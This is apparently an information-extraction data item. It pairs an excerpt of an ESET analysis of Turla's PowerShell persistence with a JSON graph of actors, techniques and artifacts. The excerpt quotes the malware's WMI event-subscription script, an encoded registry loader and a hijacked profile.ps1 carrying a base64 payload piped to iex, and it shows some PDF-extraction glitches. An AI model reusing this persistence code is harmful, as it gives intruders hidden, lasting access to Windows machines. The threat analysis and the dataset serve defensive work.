@@ -1,0 +1,135 @@
+
+
+
+Sentence : Persistence
+The PowerShell scripts are not simple droppers; they persist on the system as they regularly load into memory only
+the embedded executables. We have seen Turla operators use two persistence methods:
+A Windows Management Instrumentation (WMI) event subscription
+Alteration of the PowerShell profile (profile.ps1 file).
+Windows Management Instrumentation
+In the first case, attackers create two WMI event filters and two WMI event consumers . The consumers are simply
+command lines launching base64-encoded PowerShell commands that load a large PowerShell script stored in the
+Windows registry. Figure 1 shows how the persistence is established.
+https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/ 1/11
+5/30/2019 A dive into Turla PowerShell usage | WeLiveSecurity
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" |
+Remove-WmiObject;
+$NLP35gh = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments
+@{name='Syslog
+Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe enc $HL39fjh";RunInteractively='false'};
+Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| RemoveWmiObject;
+Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log
+Adapter'} | Remove-WmiObject;
+$IT825cd = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND
+TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
+$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log
+Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments
+@{Filter=$VQI79dcf;Consumer=$NLP35gh};
+Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject;
+Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD
+Bridge'} | Remove-WmiObject;
+$IT825cd = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Perf‐
+FormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime
+< 400";
+$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD
+Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments
+@{Filter=$VQI79dcf;Consumer=$NLP35gh};
+Figure 1. Persistence using WMI
+These events will run respectively at 15:30:40 and when the system uptime is between 300 and 400 seconds. The
+variable $HL39fjh contains the base64-encoded PowerShell command shown in Figure 2. It reads the Windows
+Registry key where the encrypted payload is stored, and contains the password and the salt needed to decrypt the
+payload.
+1 [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(")) |
+iex ;Text.Encoding::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty '$ZM172da').'$WY79ad')) |
+iex
+Figure 2. WMI consumer PowerShell command
+Finally, the script stores the encrypted payload in the Windows registry. Note that the attackers seem to use a
+different registry location per organization. Thus, it is not a useful indicator to detect similar intrusions.
+Profile.ps1
+In the latter case, attackers alter the PowerShell profile. According to the Microsoft documentation:
+A PowerShell profile is a script that runs when PowerShell starts. You can use the profile as a logon script to
+customize the environment. You can add commands, aliases, functions, variables, snap-ins, modules, and
+PowerShell drives.
+Figure 3 shows a PowerShell profile modified by Turla.
+https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/ 2/11
+5/30/2019 A dive into Turla PowerShell usage | WeLiveSecurity
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+try
+{
+$SystemProc = (Get-WmiObject 'Win32_Process' | ?{$.ProcessId -eq $PID} | % {Invoke-WmiMethod -InputO‐
+bject $ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-15-18"})
+if ("$SystemProc" -ne "")
+{
+$([Convert]::ToBase64String($(Text.Encoding::ASCII.GetBytes("$([DateTime]::Now.ToString('G')):
+STARTED ") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append;
+gAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAo‐
+AFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIg‐
+BKAEYAZABJAFIAegBRADQATQBXAFIAawBJAEQAMABuAFEAMQBsAEQAVgBEAE0ANQBNAHoAUQB3AFo‐
+AbQBaAG8ASgB6AHMAZwBKAEUAWgBaAE4AVABKAGoAWgBUADAAbgBUAGsATgBEAFUAagBrADUATg‐
+B6AEIAbwBaAG0AaABqAEoAegBzAGcASQBBAD0APQAiACkAKQAgAHwAIABpAGUAeAAgADsAWw‐
+BUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGk‐
+AbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBu‐
+AGcAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAnAEgASwBMAE0AOgBcAF‐
+MATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwASQBuAHQAZQByAG4AZQB0ACAAR‐
+QB4AHAAbABvAHIAZQByAFwAQQBjAHQAaQB2AGUAWAAgAEMAbwBtAHAAYQB0AGkAYgBpAGwAa‐
+QB0AHkAXAB7ADIAMgA2AGUAZAA1ADMAMwAtAGYAMQBiADAALQA0ADgAMQBkAC0AYQBkADIANgAt‐
+ADAAYQBlADcAOABiAGMAZQA4ADEAZAA3AH0AJwApAC4AJwAoAEQAZQBmAGEAdQBsAHQAKQAnACk‐
+AKQAgAHwAIABpAGUAeAA=")) | iex | Out-Null;
+kill $PID;
+}
+}
+catch{$([Convert]::ToBase64String($(Text.Encoding::ASCII.GetBytes("$([DateTime]::Now.ToString('G')): $
+") | %{ $ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
+Figure 3. Hijacked profile.ps1 file
+The base64-encoded PowerShell command is very similar to the one used in the WMI consumers.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "PowerShell scripts", "type" : "EXEF"},
+        {"id": 2, "description": "Turla operators", "type" : "ACTO"},
+        {"id": 3, "description": "Windows Management Instrumentation (WMI) event subscription", "type" : "TTPS"},
+        {"id": 4, "description": "profile.ps1 file", "type" : "DOCF"},
+        {"id": 5, "description": "Syslog Consumer WMI event consumer", "type" : "TTPS"},
+        {"id": 6, "description": "Log Adapter Filter WMI event filter", "type" : "TTPS"},
+        {"id": 7, "description": "AD Bridge Filter WMI event filter", "type" : "TTPS"},
+        {"id": 8, "description": "base64-encoded PowerShell command in registry", "type" : "REGI"},
+        {"id": 9, "description": "encrypted payload in Windows registry", "type" : "REGI"},
+        {"id": 10, "description": "C:\\Users\\Public\\Downloads\\thumbs.ini", "type" : "SYSP"}
+    ],
+    "edges": [
+        {"source": 2, "target": 3, "rel_name" : "uses"},
+        {"source": 2, "target": 4, "rel_name" : "alters"},
+        {"source": 3, "target": 5, "rel_name" : "creates"},
+        {"source": 3, "target": 6, "rel_name" : "creates"},
+        {"source": 3, "target": 7, "rel_name" : "creates"},
+        {"source": 8, "target": 9, "rel_name" : "decrypts"},
+        {"source": 4, "target": 10, "rel_name" : "writes to"}
+    ]
+}
